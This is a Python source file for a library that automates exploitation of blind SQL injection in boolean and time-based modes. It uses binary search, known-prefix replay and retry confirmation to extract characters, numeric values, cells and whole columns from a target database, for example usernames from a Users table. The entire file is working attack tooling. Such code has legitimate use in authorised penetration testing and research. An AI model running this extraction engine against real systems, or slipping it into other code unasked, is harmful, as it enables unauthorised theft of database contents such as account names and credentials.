#!/bin/python

import logging
from typing import Callable, Generator, Protocol

from .abstractConfig import AbstractConfig, Mode

logger = logging.getLogger(__name__)

class CandidateTooNarrow(Exception):
    """The target denied the resolved code on every retry."""


def _as_codes(chars: list[int] | str | None) -> list[int]:
    if isinstance(chars, str):
        return [ord(c) for c in chars]
    return chars or []


class _SearchDomain(Protocol):
    """Anything BinarySearch can index into: a CandidateSet or a range."""

    def __len__(self) -> int: ...
    def __getitem__(self, index: int, /) -> int: ...


class CandidateSet:
    """The char codes to search, plus end_char."""

    def __init__(self, candidates: set[int] | list[int] | str, end_char: int) -> None:
        self.candidates = sorted(
            {ord(c) for c in candidates} if isinstance(candidates, str) else set(candidates)
        )
        self.all: list[int] = sorted({*self.candidates, end_char})

    def __len__(self) -> int:
        return len(self.all)

    def __getitem__(self, index: int) -> int:
        return self.all[index]


class SearchStrategy(Protocol):
    """narrow() folds the oracle's answer in and returns the resolved code
    once converged, else None."""

    def next_operator(self, config: AbstractConfig) -> str: ...
    def narrow(self, result: bool) -> int | None: ...

    def resolved_by_equality(self) -> bool:
        """True when the target itself answered an equality: no confirming needed."""
        return False


class BinarySearch(SearchStrategy):
    """Dichotomy over a _SearchDomain."""

    def __init__(self, domain: _SearchDomain) -> None:
        self.__domain = domain
        self.__min_index = 0
        self.__max_index = len(domain) - 1
        self.__probe_index: int
        self.__resolved_by_equality = False

    def resolved_by_equality(self) -> bool:
        return self.__resolved_by_equality

    def next_operator(self, config: AbstractConfig) -> str:
        if self.__max_index - self.__min_index < 2:
            self.__probe_index = self.__min_index
            return config.equal(self.__domain[self.__probe_index])

        self.__probe_index = (self.__max_index - self.__min_index) // 2 + self.__min_index
        return config.range_(
            self.__domain[self.__probe_index],
            self.__domain[self.__min_index],
            self.__domain[self.__max_index],
        )

    def narrow(self, result: bool) -> int | None:
        if self.__max_index - self.__min_index < 2:
            resolved = self.__min_index if result else self.__max_index
            # a false answer only rules the probed code out; the other end of
            # the window is an assumption, not a match
            self.__resolved_by_equality = result
            return self.__domain[resolved]

        if result:
            self.__min_index = self.__probe_index + 1
        else:
            self.__max_index = self.__probe_index
        return None


class PrefixReplay:
    """Tests a known prefix one char at a time, falling back on the first
    mismatch or once the prefix is exhausted."""

    def __init__(
        self,
        start_with: list[int],
        current_injection_char: int,
        start_index: int,
        fallback: SearchStrategy,
    ) -> None:
        self.__start_with = start_with
        self.__offset = current_injection_char - start_index
        self.__fallback = fallback
        self.__active = 0 <= self.__offset < len(start_with)
        self.__matched_prefix_char = False

    def next_operator(self, config: AbstractConfig) -> str:
        if self.__active:
            return config.equal(self.__start_with[self.__offset])
        return self.__fallback.next_operator(config)

    def narrow(self, result: bool) -> int | None:
        if self.__active:
            if result:
                self.__matched_prefix_char = True
                return self.__start_with[self.__offset]
            self.__active = False
            return None
        return self.__fallback.narrow(result)

    def resolved_by_equality(self) -> bool:
        return self.__matched_prefix_char or self.__fallback.resolved_by_equality()


class SearchContext:
    """State of one in-progress extraction: candidate domain, known prefix,
    char position, and the strategy resolving that position."""

    def __init__(
        self,
        config: AbstractConfig,
        candidates: set[int] | list[int] | str,
        start_with: list[int] | str | None = None,
    ) -> None:
        self.candidate_set = CandidateSet(candidates, config.end_char)
        self.start_with = _as_codes(start_with)
        self.current_index = config.start_index
        self.__config_start_index = config.start_index

    def advance_to_next_char(self) -> None:
        self.current_index += 1

    def restart(self, start_with: list[int] | str | None = None) -> None:
        self.current_index = self.__config_start_index
        if start_with is not None:
            self.start_with = _as_codes(start_with)

    def new_strategy(self) -> SearchStrategy:
        binary_search = BinarySearch(self.candidate_set)
        if not self.start_with:
            return binary_search

        return PrefixReplay(
            self.start_with, self.current_index, self.__config_start_index, binary_search
        )


class SqlInja:
    """help for automated exploitation of SQL Blind (Time or Boolean) Injection"""
    def __init__(
        self,
        config: AbstractConfig,
        execute_request: Callable[[str, int], bool],
        mode: Mode = Mode.BOOLEAN,
        sleep_duration: int = 1,
        confirm_char_max_retries: int = 2,
    ) -> None:
        """execute_request runs the injection and returns whether the tested
        condition is true. confirm_char_max_retries=0 gives up the ability to
        tell a noisy oracle from a too-narrow candidate set."""
        if mode == Mode.TIME and config.as_time is None:
            raise ValueError("this config has no time-blind primitive (as_time is None)")

        self.sleep_duration = sleep_duration
        self.__mode: Mode = mode
        self.__config: AbstractConfig = config
        self.__execute_request: Callable[[str, int], bool] = execute_request
        self.__confirm_char_max_retries: int = confirm_char_max_retries

    def __embed_condition(self, condition: str) -> str:
        if self.__mode == Mode.TIME:
            assert self.__config.as_time is not None
            return self.__config.as_time(condition, self.sleep_duration)
        return self.__config.as_boolean(condition)

    def __char_code_expr(self, sub_request: str, current_index: int) -> str:
        return self.__config.code_or_end(
            self.__config.char_code(
                self.__config.substring(sub_request, current_index)
            )
        )

    def is_null(self, sub_request: str) -> bool:
        """Whether sub_request yields NULL. One request."""
        payload = self.__embed_condition(self.__config.is_null(f"({sub_request})"))
        return self.__execute_request(payload, self.sleep_duration)

    def __resolve(self, new_strategy: Callable[[], SearchStrategy], expr: str, char: int = 0) -> int:
        """Probe/narrow until converged, then confirm: the dichotomy always
        lands on some domain entry, even when the real char is in none.
        new_strategy() starts a fresh search, one per attempt."""
        max_retries = max(self.__confirm_char_max_retries, 0)

        for attempt in range(max_retries + 1):
            strategy = new_strategy()
            result = self.__probe_and_narrow(strategy, expr)
            if strategy.resolved_by_equality() or self.__confirm(expr, result):
                if attempt:
                    logger.warning("char %d confirmed after %d retries (noisy oracle)", char, attempt)
                return result

        if max_retries == 0:
            raise CandidateTooNarrow(f"char {char} unconfirmed (no retry budget to diagnose)")
        raise CandidateTooNarrow(f"char {char} denied on all {max_retries + 1} attempts")

    def __probe_and_narrow(self, strategy: SearchStrategy, expr: str) -> int:
        result = None
        while result is None:
            operator = strategy.next_operator(self.__config)
            payload = self.__embed_condition(f"{expr}{operator}")
            probe_result = self.__execute_request(payload, self.sleep_duration)
            result = strategy.narrow(probe_result)
        return result

    def __confirm(self, expr: str, code: int) -> bool:
        payload = self.__embed_condition(f"{expr}{self.__config.equal(code)}")
        return self.__execute_request(payload, self.sleep_duration)

    def check(self, request: str) -> bool:
        """test if the current configuration is a valid injection"""
        condition = self.__config.has_result(request)
        payload = self.__embed_condition(condition)
        return self.__execute_request(payload, self.sleep_duration)

    def extract_val(self, sub_request: str, min_value: int, max_value: int) -> int:
        """Extract a scalar integer expression (e.g. COUNT(*)). Raises
        ValueError if min_value > max_value, or if the value never confirms --
        the only thing catching a range that excludes the real value."""
        if min_value > max_value:
            raise ValueError(f"min_value {min_value} > max_value {max_value}")

        expr = f"({sub_request})"
        domain = range(min_value, max_value + 1)
        try:
            return self.__resolve(lambda: BinarySearch(domain), expr)
        except CandidateTooNarrow as exc:
            raise ValueError(f"no value in [{min_value}, {max_value}] confirmed") from exc

    def extract_char(self, sub_request: str, candidates: set[int] | list[int] | str, current_index: int | None = None) -> str:
        """Extract the char at the current index of sub_request."""

        if current_index is None:
            current_index = self.__config.start_index

        search_context = SearchContext(self.__config, candidates)
        if not search_context.candidate_set.candidates:
            raise ValueError("candidates must not be empty")
        return chr(self.__resolve(
            search_context.new_strategy,
            self.__char_code_expr(sub_request, current_index),
            current_index,
        ))

    def extract_until_end_char(
        self,
        sub_request: str,
        candidates: set[int] | list[int] | str,
        max_length: int = 255,
        start_with: list[int] | str | None = None,
    ) -> Generator[str, None, None]:
        """Yield each char in a cell, stopping at end_char. Cheaper than
        extract_by_length(), but needs end_char to be reliable: prefer that
        one where NULL and '' are the same value (e.g. Oracle). start_with
        resumes from known chars without re-probing them."""
        search_context = SearchContext(self.__config, candidates, start_with=start_with)
        if not search_context.candidate_set.candidates:
            raise ValueError("candidates must not be empty")
        if self.__config.end_char in search_context.candidate_set.candidates:
            raise ValueError(
                f"end_char {self.__config.end_char} is a candidate; use extract_by_length()"
            )
        yield from self.__read_chars(sub_request, search_context, max_length)

    def __resolve_char_at_cursor(self, sub_request: str, search_context: SearchContext) -> int:
        char_code = self.__char_code_expr(sub_request, search_context.current_index)
        return self.__resolve(
            search_context.new_strategy, char_code, search_context.current_index
        )

    def __read_chars(
        self, sub_request: str, search_context: SearchContext, max_length: int = 255
    ) -> Generator[str, None, None]:
        read = 0
        while True:
            if read >= max_length:
                raise RuntimeError(f"no end_char within max_length={max_length}")

            new_item = self.__resolve_char_at_cursor(sub_request, search_context)

            if new_item == self.__config.end_char:
                break

            yield chr(new_item)
            read += 1
            search_context.advance_to_next_char()

    def extract_by_length(
        self,
        sub_request: str,
        candidates: set[int] | list[int] | str,
        max_length: int = 255,
        start_with: list[int] | str | None = None,
    ) -> Generator[str, None, None]:
        """Yield each char in a cell, reading its length first, then exactly
        that many chars. Costs one extra search for the length, but needs no
        end_char -- so it works where end_char is unreliable, and lets
        end_char itself be a candidate."""

        search_context = SearchContext(self.__config, candidates, start_with=start_with)
        if not search_context.candidate_set.candidates:
            raise ValueError("candidates must not be empty")

        length_request = self.__config.code_or_end(self.__config.length(f"({sub_request})"))
        length = self.extract_val(length_request, 0, max_length)
        for _ in range(length):
            yield chr(self.__resolve_char_at_cursor(sub_request, search_context))
            search_context.advance_to_next_char()

    def extract_cell(
        self,
        sub_request: str,
        candidates: set[int] | list[int] | str,
        max_length: int = 255,
        start_with: list[int] | str | None = None,
    ) -> str | None:
        """Extract one cell as a string, or None if it holds NULL. Costs one
        request more than extract_by_length(), which cannot tell NULL from ''."""
        if self.is_null(sub_request):
            return None
        return "".join(
            self.extract_by_length(sub_request, candidates, max_length, start_with)
        )

    def __iter_row_requests(
        self, request_template: str, start_index: int, max_index: int
    ) -> Generator[tuple[int, str], None, None]:
        if "{index}" not in request_template:
            raise ValueError(f"request_template needs an '{{index}}' placeholder: {request_template!r}")
        index = start_index
        while True:
            if max_index != -1 and index > max_index:
                logger.warning("stopped at max_index=%d", max_index)
                break

            request = request_template.format(index=self.__config.limit(index, 1))
            if not self.check(request):
                break

            yield index, request
            index += 1

    def extract_column(
        self,
        request_template: str,
        candidates: set[int] | list[int] | str,
        start_index: int,
        max_index: int = 999,
        start_with: list[int] | str | None = None,
    ) -> Generator[Generator[str, None, None], None, None]:
        """Yield one generator per row, each streaming its cell char by char.
        request_template needs a '{index}' placeholder for the config's
        limit() fragment, e.g. "SELECT UserName FROM Users {index}".
        start_with resumes only the row at start_index; max_index caps the
        rows read, -1 disables it. A NULL row streams as no chars, like an
        empty one -- use extract_column_rows() to tell them apart."""
        for index, request in self.__iter_row_requests(request_template, start_index, max_index):
            row_start_with = start_with if index == start_index else None
            row_search_context = SearchContext(
                self.__config, candidates, start_with=row_start_with
            )

            def _row(
                request: str = request, search_context: SearchContext = row_search_context
            ) -> Generator[str, None, None]:
                yield from self.__read_chars(sub_request=request, search_context=search_context)
            yield _row()

    def extract_column_rows(
        self,
        request_template: str,
        candidates: set[int] | list[int] | str,
        start_index: int,
        max_index: int = 999,
        start_with: list[int] | str | None = None,
    ) -> Generator[str | None, None, None]:
        """Like extract_column(), but yields each row fully resolved as a
        string, or None for a NULL cell. Each row carries the previous one as
        start_with, so a shared prefix (e.g. sorted values) costs one probe
        per shared char instead of a full search."""
        search_context = SearchContext(self.__config, candidates, start_with=start_with)
        for _, request in self.__iter_row_requests(request_template, start_index, max_index):
            if self.is_null(request):
                yield None
                continue
            row = "".join(
                self.__read_chars(sub_request=request, search_context=search_context)
            )
            yield row
            search_context.restart(start_with=row)
